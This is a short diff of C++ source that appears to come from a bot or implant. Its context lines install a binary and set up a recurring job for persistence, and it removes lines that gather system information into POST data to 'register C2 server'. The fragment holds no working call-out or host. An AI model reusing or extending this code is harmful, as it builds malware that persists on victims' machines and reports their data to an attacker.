@@ -25,13 +25,6 @@ int main() {
         install.InstallFile(BIN, BIN_NEW);
         install.InitRecurringJob();
 
-        // Create POST form from DataList and register C2 server
-        // std::ofstream ofs("post_form.txt", std::ofstream::out);
-        // ofs << auth.GetHash();
-        // ofs.close();
-        sysinfo::DataList sysinfo(auth.GetHash());
-        std::string data = sysinfo.GetPostData();
-        
     } else {
         auth.Retrieve();
 
